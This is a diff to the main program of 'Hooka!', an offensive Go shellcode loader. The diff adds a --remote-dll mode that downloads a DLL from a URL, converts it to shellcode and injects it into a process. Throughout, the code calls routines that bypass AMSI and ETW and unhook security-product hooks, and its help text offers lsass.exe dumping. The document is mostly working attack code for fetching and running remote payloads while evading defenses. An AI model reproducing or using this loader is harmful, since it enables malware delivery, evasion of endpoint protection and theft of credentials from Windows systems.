@@ -20,35 +20,50 @@ func main() {
   var err error
 
   // Parse CLI flags and retrieve values
-  sc_url, sc_file, dll_file, technique, hook_detect, halos, unhook, base64_flag, hex_flag, test_flag, amsi, etw, lsass := core.ParseFlags()
+  sc_url, sc_file, dll_file, dll_url, technique, hook_detect, halos, unhook, base64_flag, hex_flag, test_flag, amsi, etw, lsass := core.ParseFlags()
 
   l.PrintBanner("Hooka!") // Print script banner with version
   l.Println(" by D3Ext - v0.1")
   time.Sleep(100 * time.Millisecond)
 
-  if (sc_url == "") && (sc_file == "") && (dll_file == "") && (!hook_detect) && (!test_flag) && (lsass == "") { // Enter here if any main flag was especified
+  if (sc_url == "") && (sc_file == "") && (dll_file == "") && (dll_url == "") && (!hook_detect) && (!test_flag) && (lsass == "") { // Enter here if any main flag was especified
     l.Println()
     flag.PrintDefaults()
     l.Println("\n[-] Parameters missing")
     l.Println("[*] Provide a shellcode to inject (--file/--url/--dll), detect hooked functions (--hooks), test program capabilities (--test) or dump lsass.exe process (--lsass)\n")
     os.Exit(0)
 
-  } else if (sc_url != "") && (sc_file != "") && (dll_file == "") { // Check if both --url and --file flags were passed
+  } else if (sc_url != "") && (sc_file != "") && (dll_file == "") && (dll_url == "") { // Check if both --url and --file flags were passed
     l.Println()
     flag.PrintDefaults()
     l.Println("\n[-] Error: you can't use --url and --file at the same time!\n")
 
-  } else if (sc_url != "") && (sc_file == "") && (dll_file != "") { // Check if both --url and --dll flags were passed
+  } else if (sc_url != "") && (sc_file == "") && (dll_file != "") && (dll_url == "") { // Check if both --url and --dll flags were passed
     l.Println()
     flag.PrintDefaults()
     l.Println("\n[-] Error: you can't use --url and --dll at the same time!\n")
 
-  } else if (sc_url == "") && (sc_file != "") && (dll_file != "") { // Check if both --file and --dll flags were passed
+  } else if (sc_url == "") && (sc_file != "") && (dll_file != "") && (dll_url == "") { // Check if both --file and --dll flags were passed
     l.Println()
     flag.PrintDefaults()
     l.Println("\n[-] Error: you can't use --file and --dll at the same time!\n")
 
-  } else if (sc_url != "") && (sc_file == "") && (dll_file == "") {
+  } else if (sc_url == "") && (sc_file == "") && (dll_file != "") && (dll_url != "") {
+    l.Println()
+    flag.PrintDefaults()
+    l.Println("\n[-] Error: you can't use --dll and --remote-dll at the same time!\n")
+
+  } else if (sc_url != "") && (sc_file == "") && (dll_file == "") && (dll_url != "") {
+    l.Println()
+    flag.PrintDefaults()
+    l.Println("\n[-] Error: you can't use --url and --remote-dll at the same time!\n")
+
+  } else if (sc_url == "") && (sc_file != "") && (dll_file == "") && (dll_url != "") {
+    l.Println()
+    flag.PrintDefaults()
+    l.Println("\n[-] Error: you can't use --file and --remote-dll at the same time!\n")
+
+  } else if (sc_url != "") && (sc_file == "") && (dll_file == "") && (dll_url == "") {
 
     if (technique != "CreateRemoteThread") && (technique != "CreateProcess") && (technique != "QueueApcThread") && (technique != "UuidFromString") && (technique != "Fibers") && (technique != "") {
       l.Println()
@@ -134,7 +149,7 @@ func main() {
     time.Sleep(100 * time.Millisecond)
     l.Println("[+] Shellcode should have been executed without errors!\n")
 
-  } else if (sc_file != "") && (sc_url == "") && (dll_file == "") {
+  } else if (sc_file != "") && (sc_url == "") && (dll_file == "") && (dll_url == "") {
 
     if (base64_flag) && (hex_flag) { // Check if both flags were passed
       l.Println()
@@ -215,7 +230,7 @@ func main() {
     time.Sleep(100 * time.Millisecond)
     l.Println("[+] Shellcode should have been executed without errors!\n")
 
-  } else if (sc_url == "") && (sc_file == "") && (dll_file != "") {
+  } else if (sc_url == "") && (sc_file == "") && (dll_file != "") && (dll_url == "") {
 
     var dll_filename string
     var dll_func string
@@ -288,6 +303,63 @@ func main() {
     time.Sleep(100 * time.Millisecond)
     l.Println("[+] Shellcode should have been executed without errors!\n")
 
+  } else if (sc_url == "") && (sc_file == "") && (dll_file == "") && (dll_url != "") {
+
+    dll_func := strings.Split(dll_url, ",")[1]
+    dll_url := strings.Split(dll_url, ",")[0]
+
+    time.Sleep(200 * time.Millisecond)
+    if (dll_func != "") {
+      l.Println("\n[+] Function to execute: " + dll_func)
+    } else {
+      l.Println("\n[+] Function to execute: default")
+    }
+    time.Sleep(300 * time.Millisecond)
+
+    l.Println("[*] Retrieving DLL from url...")
+    dll_bytes, err := core.GetShellcodeFromUrl(dll_url)
+    if err != nil { // Handle error
+      l.Println("[-] An error has ocurred retrieving remote dll!")
+      l.Fatal(err)
+    }
+    time.Sleep(300 * time.Millisecond)
+    
+    l.Println("[*] Converting raw bytes to shellcode")
+    shellcode, err := core.ConvertDllBytesToShellcode(dll_bytes, dll_func, "") // Convert DLL to shellcode
+    if err != nil { // Handle error
+      l.Fatal(err)
+    }
+    time.Sleep(300 * time.Millisecond)
+    l.Println("[+] DLL converted successfully!")
+    time.Sleep(200 * time.Millisecond)
+
+    checkAmsi(amsi)
+
+    checkEtw(etw)
+
+    checkUnhook(unhook, technique)
+
+    time.Sleep(300 * time.Millisecond)
+    if (technique != "") { // Check if technique has value so it doesn't get printed twice
+      l.Println("[*] Injecting DLL shellcode using " + technique + " technique")
+    }
+
+    if (halos) {
+      err = core.InjectHalos(shellcode, technique)
+      if err != nil {
+        l.Fatal(err)
+      }
+
+    } else {
+      err = core.Inject(shellcode, technique) // Inject shellcode w/o halo's gate
+      if err != nil { // Handle error
+        l.Fatal(err)
+      }
+    }
+
+    time.Sleep(200 * time.Millisecond)
+    l.Println("[+] Shellcode should have been executed without errors!\n")
+
   } else if (sc_url == "") && (sc_file == "") && (dll_file == "") && (hook_detect) { // Enter here if --hooks flag was especified
 
     l.Println("\n[*] Detecting hooked functions...")
@@ -321,6 +393,8 @@ func main() {
     checkAmsi(amsi)
 
     checkEtw(etw)
+
+    checkUnhook(unhook, technique)
 
     if (technique != "") {
       l.Println("[*] Injecting shellcode using " + technique + " technique")
@@ -417,8 +491,8 @@ func checkUnhook(unhook int, technique string) {
       l.Fatal(err)
     }
     l.Println("[+] Functions have been unhooked!")
-
   }
 }
+
 
 
